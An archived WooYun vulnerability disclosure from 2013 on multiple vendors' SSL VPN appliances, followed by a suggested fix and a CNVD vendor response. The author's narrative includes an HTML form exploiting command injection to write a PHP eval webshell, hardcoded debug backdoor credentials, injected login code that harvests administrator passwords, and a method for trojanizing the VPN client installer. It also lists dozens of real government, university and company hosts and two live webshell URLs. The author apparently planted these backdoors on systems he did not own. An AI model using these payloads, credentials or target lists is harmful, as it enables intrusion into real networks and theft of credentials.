@@ -1,0 +1,452 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[浅谈内网安全]--国内外多家vpn设备厂商批量漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[浅谈内网安全]--国内外多家vpn设备厂商批量漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/紫梦芊">紫梦芊</a> 
+</li><li>提交时间：		2013-06-01 11:23</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-06：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-23：	细节向普通白帽子公开<br/>
+									2013-07-13：	细节向实习白帽子公开<br/>
+									2013-08-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">继之前乌云上爆出深信服大量高危漏洞后,大家就感到vpn等基础设施的安全性非常值得重视,一暴露就涉及到内网系统的安全性,毕竟这些系统的安全性大都依赖于vpn验证有效用户，现在来发些其他厂商的高危吧(据知有人手中还有新版M5.9的0day).<br />
+<br />
+该漏洞涉及到包括网御神州、天融信、西安网赢、卫士通、吉大正元、美国凹凸、德国 ANIX等多家VPN厂商设备在政务、地产、运营商、政府部门、高校、企业、公安、司法、银行等行业存在的任意文件下载、远程命令执行、维护后门、三方平台帐号泄漏、恶意客户端下发等高位漏洞。  <br />
+<br />
+发现有些时日了,很可惜的错过了乌云众测四期(知道四期是关于vpn的时四期已经结束了,不知道这些漏洞是不是那个厂商也有的)<br />
+为了防止像深信服那种问题，建议由cncert分发给各厂商,然后3个月后公开。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">看到在北大读研的同学Ray发的信息东点西点进到了vpn.pku.edu.cn(当时还是o2的vpn,现在可以借鉴北大计算中心https://124.205.79.78/)然后尝试渗透测试,发现有个证书请求链接,点进去看可以下载东西,但是没有初始化mimiCA,于是想到同源通注,就去网上找相同代码特征的系统 很容易地找到了vpn.cnu.edu.cn/sub_ca.php <br />
+<br />
+ </p><p class="detail"><a href="../images/01082533e49d26e65d8ca828a837f9b40383b310.jpg" target="_blank"><img src="../images/01082533e49d26e65d8ca828a837f9b40383b310.jpg" alt="bb.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+在sub_ca_action.php?id=0看到 任意文件下载<br />
+<br />
+</p><p class="detail"><a href="../images/0108343884584cbb21f4cd5ac9e351561071c7c1.jpg" target="_blank"><img src="../images/0108343884584cbb21f4cd5ac9e351561071c7c1.jpg" alt="cc.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+分别传入参数/etc/httpd/httpd.conf  和 httpd.conf获得apache配置 找到了web根路径为/ssl/www 于是想看看漏洞代码是如何的<br />
+<br />
+<br />
+<br />
+ 然后分别传入传 /ssl/www/minica_down.php 和minica_down.php下载minica_down.php<br />
+<br />
+前两行是发现<br />
+<br />
+</p><pre><code>if($_POST[&#039;realfile&#039;])<br />
+	exec(&quot;cp &quot;.$_POST[&#039;realfile&#039;].&quot; &quot;.$_POST[&#039;path&#039;].&quot;&quot;);</code></pre><p class='detail'><br />
+<br />
+（感觉这些vpn设备的开发管用C和shell的思想,所以喜欢用system和exec不喜欢php内置函数）<br />
+<br />
+幸好之前在淘宝实习时学过白盒 能看懂些代码 于是 有了任意命令执行<br />
+<br />
+</p><pre><code>&lt;form action=&quot;https://IP/minica_down.php&quot; method=&quot;post&quot;&gt;<br />
+&lt;input name=&quot;realfile&quot; type=&quot;hidden&quot; value=&quot;aimee.php aimee.php || echo &#039;&lt;?php eval($_POST[cmd]);?&gt;It works&#039; &gt;/ssl/www/aimee.php &quot;&gt;<br />
+&lt;input type=hidden&gt;<br />
+&lt;input type=submit&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+提交一个后门 <br />
+<br />
+</p><p class="detail"><a href="../images/0108423945359f55254de6e57fc0eb8ab0afca4e.jpg" target="_blank"><img src="../images/0108423945359f55254de6e57fc0eb8ab0afca4e.jpg" alt="dd.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+用菜刀连接，获得root权限, 这还没结束。<br />
+<br />
+<br />
+<br />
+对代码进行些审计,发现开发留的后门/ssl/www/admin/debug.php 帐号密码o2micro killbug(部分厂家已经去掉)<br />
+<br />
+<br />
+<br />
+然后发现mysql不向外开放并且是unix的socket方式去访问的 <br />
+<br />
+但是可以通过<br />
+<br />
+ini_set(&quot;mysql.default_socket = /var/run/mysql/mysql.sock&quot;); 去连接<br />
+<br />
+可以exec(&quot;/ssl/mysqld/mysqldump &gt;xxx&quot;) 导出或是用exec执行sql等<br />
+<br />
+<br />
+<br />
+然后管理员密码是sha1加密了的 于是在/ssl/www/admin/login_action.php第128行(认证成功后)加入  (初学php,别见笑)<br />
+<br />
+</p><pre><code>$obj=file_get_contents(&quot;admin.json&quot;);<br />
+		$userList=json_decode($obj);<br />
+		$userList-&gt;$UserName=$UserPass;<br />
+		file_put_contents(&quot;admin.json&quot;,json_encode($userList));</code></pre><p class='detail'><br />
+<br />
+钓取管理员账号密码 <br />
+<br />
+<br />
+<br />
+钓鱼后进入后台了解了下系统,发现三方LDAP、AD认证方式管理帐号密码可以在html代码中看到明文,<br />
+<br />
+其次就是存储三方系统登录地址、帐号、密码用来实现SSO的子帐号也是明文,数据库中一看,证实未进行任何加密处理,至少也应该来个AES吧(一些系统没配认证方式和子帐号)<br />
+<br />
+<br />
+<br />
+使用一次vpn后发现是web端安装插件方式安装客户端,于是尝试给客户端加点东西试试,对于dll绑恶意dll我不会(而且给dll签名没证书),只能在exe上拙劣的下手,于是到/ssl/www/download/ClientSetup.exe(app.exe.cab应该也存在问题)<br />
+<br />
+下载下来,用winrar生成自解压运行的包含恶意文件和ClientSetup.exe的新ClientSetup.exe 传入到原目录替换后能够达到在内网种植木马的功效。<br />
+<br />
+<br />
+<br />
+-------------------------------------------------------<br />
+<br />
+存在漏洞的站点至少包括<br />
+<br />
+<br />
+<br />
+美国凹凸科技(o2security)<br />
+<br />
+https://vpn.bit.edu.cn/ 北京理工<br />
+<br />
+https://sslvpn.bjtu.edu.cn/ 北交大<br />
+<br />
+https://125.46.88.100/ 郑州大学<br />
+<br />
+https://219.80.0.19/p 国泰地产集团<br />
+<br />
+https://info.nai.edu.cn/ 北京国家会计学院<br />
+<br />
+https://124.205.79.78/ 北大计算中心<br />
+<br />
+https://210.82.53.201/ 北京联合大学<br />
+<br />
+https://vpn.cnu.edu.cn/ 首都师大<br />
+<br />
+https://vpn.mcut.edu.tw/ 台湾明志科技大学<br />
+<br />
+https://ac.whlib.gov.cn 武汉图书馆<br />
+<br />
+https://sslvpn.nhcue.edu.tw 新竹教育大学<br />
+<br />
+https://isms.ydu.edu.tw/   育達商業科技大學<br />
+<br />
+https://sslvpn.ydu.edu.tw/   育達商業科技大學<br />
+<br />
+https://vpn.cute.edu.tw   中国(台湾)科技大学<br />
+<br />
+https://sslvpn.ntue.edu.tw  国立台北教育大学<br />
+<br />
+https://vpn.psi.com.tw  升阳国际<br />
+<br />
+https://maltimur.jksm.gov.my/ 马来西亚某政府网站<br />
+<br />
+https://vpn.ccom.edu.cn   中央音乐学院<br />
+<br />
+https://vpn.dlmu.edu.cn   大连海事大学<br />
+<br />
+https://vpn.wanfang.edu.cn 河南理工<br />
+<br />
+https://vpn.genius.com.cn  深圳巨灵<br />
+<br />
+https://sslvpn.changhongit.com 长虹佳华<br />
+<br />
+https://vpn.jnrd.com.cn  北京京能热电<br />
+<br />
+https://sslvpn.kworld.com.tw  廣寰台北辦公室<br />
+<br />
+https://www.oo586.com/ 易宝支付<br />
+<br />
+https://svpn.mbatec.com.tw 新碩資訊<br />
+<br />
+https://sslvpn.szs.com.tw 新日兴<br />
+<br />
+https://sslvpn.gzcatv.net 广数传媒<br />
+<br />
+https://e.nais.net.cn    农业部农E通<br />
+<br />
+https://vpn.thcic.cn   清华<br />
+<br />
+https://vpn.pku.edu.cn/ 北大(已经失效)<br />
+<br />
+https://vpn.cau.edu.cn/ 中国农大(已经换了)<br />
+<br />
+https://sh-vpn.o2micro.com o2<br />
+<br />
+https://bj-vpn.o2micro.com o2<br />
+<br />
+https://cd-vpn.o2micro.com o2<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+天融信 网络卫士VPN系统(admin/debug.php o2micro killbug)<br />
+<br />
+https://218.26.21.194/ 山西邮政VPN系统<br />
+<br />
+https://218.26.7.112/  山西检验检疫局VPN系统<br />
+<br />
+<br />
+<br />
+联想网神-网御神州 SecSSL3600(号称国内第一的SSLVPN)<br />
+<br />
+https://220.178.250.102/  马鞍山市行政事业单位资产管理信息系统<br />
+<br />
+https://vpn.hnuu.edu.cn/ 淮南联大<br />
+<br />
+https://222.75.160.120/<br />
+<br />
+https://60.191.18.54/<br />
+<br />
+https://61.191.18.137/  合肥市房地产市场信息系统<br />
+<br />
+https://218.22.51.114/  安徽省肥西财政局<br />
+<br />
+https://183.166.187.156/   黄山市网上房地产信息系统<br />
+<br />
+https://oa.qzbsg.gov.cn    广西钦州保税港区<br />
+<br />
+https://www.smfgny.com    陕西煤业化工集团<br />
+<br />
+https://cbj.1203.org      残疾人就业保障金征缴管理系统<br />
+<br />
+https://58.54.252.40     荆州电子政务外网<br />
+<br />
+https://218.24.94.244   沈阳市经济和信息化委员会<br />
+<br />
+https://219.141.234.54/  中国渔政管理指挥系统<br />
+<br />
+https://vpn.cdc.com.cn  成都普天电缆<br />
+<br />
+https://58.242.162.242/<br />
+<br />
+https://116.236.137.18/<br />
+<br />
+https://oa.qzbsg.gov.cn/<br />
+<br />
+https://122.225.14.154/<br />
+<br />
+https://60.191.18.54/<br />
+<br />
+<br />
+<br />
+西安网赢信息技术有限公司 护航者 <br />
+<br />
+https://125.65.179.230/  四川省丹棱县党政综合办公平台<br />
+<br />
+https://www.scxjrz.com/  四川电信安全运营中心<br />
+<br />
+<br />
+<br />
+德国ANIX<br />
+<br />
+https://vpn.tgsh.ttct.edu.tw/  台东女中<br />
+<br />
+<br />
+<br />
+卫士通 中华卫士<br />
+<br />
+https://ssl.qztc.com/welcome.php 泉州电信<br />
+<br />
+<br />
+<br />
+吉大正元<br />
+<br />
+https://oa.chnmuseum.cn/ 国家博物馆<br />
+<br />
+https://218.62.26.250/<br />
+<br />
+https://219.143.243.103/ <br />
+<br />
+<br />
+<br />
+这些里面没有minica_down的就有debug后门,没debug的就有minica_down问题 很多是都存在。<br />
+<br />
+在这些厂商描述中他们在公安网 银行专网 审计署内部网络 司法专网等私网也用了这些系统保护信息安全 据我猜想如果这些私网中肯定更有很多不堪一击的系统。<br />
+<br />
+<br />
+<br />
+所以个人认为内网安全不能仅仅去依靠防火墙 VPN IDS等设备去完成 一旦这些设备出现问题 或是被合法绕过 里面的系统如果安全性不够的话 信息泄漏是很轻易的事。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/01085247e27d6bbb303c8dd8dae537d57aba8b24.jpg" target="_blank"><img src="../images/01085247e27d6bbb303c8dd8dae537d57aba8b24.jpg" alt="cc.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01085300671fc0b9fa2e3bd97ccb2370544060db.jpg" target="_blank"><img src="../images/01085300671fc0b9fa2e3bd97ccb2370544060db.jpg" alt="dd.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010908526f306cb25cefa7765d64960e0ad05969.jpg" target="_blank"><img src="../images/010908526f306cb25cefa7765d64960e0ad05969.jpg" alt="gg.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+两个一句话例子<br />
+<br />
+https://vpn.thcic.cn/sms_inc.php<br />
+<br />
+https://218.26.21.194/sms_inc.php<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.删除debug.php<br />
+<br />
+2.minica_down.php第2和12行<br />
+<br />
+exec(&quot;cp &quot;.$_POST[&#039;realfile&#039;].&quot; &quot;.$_POST[&#039;path&#039;].&quot;&quot;);改为<br />
+<br />
+copy($_POST[&#039;realfile&#039;],$_POST[&#039;path&#039;])<br />
+<br />
+exec(&quot;rm &quot;.$_POST[&quot;path&quot;].&quot;&quot;);改为<br />
+<br />
+unlink($_POST[&#039;path&#039;])<br />
+<br />
+3.子帐号和三方认证平台管理信息使用AES或3des加密存在数据库中 防止脱裤后的更大安全危害<br />
+<br />
+4.在客户端安全加入checksum </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/紫梦芊" title="紫梦芊">紫梦芊</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024919" title="[浅谈内网安全]--国内外多家vpn设备厂商批量漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-06-03 22:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述其中三个厂商案例情况，另外四家厂商可确认产品同源，但实测未发现包含或远程执行相关结果。根据后续源代码分析，OEM为主要原因，问题根源出现在第一家厂商上。<br />
+<br />
+针对测试得到的部分结果，CNVD以及CNCERT采用以下方式进行：1、CNVD向国内相关VPN设备厂商询查是否OEM目标厂商产品，并协调涉事的三家厂商先行处置；2、对于涉及的政府和重要部门，转由CNCERT协调设备管理单位处置（包含一些工业和信息化部直属高校）；<br />
+<br />
+最早在明天应该会有一个通信行业通报出来，向社会公众发布预警。<br />
+<br />
+rank 30?40?</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24919";
+var bugRating="2";
+var myRating="";
+var ratingCount="11";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
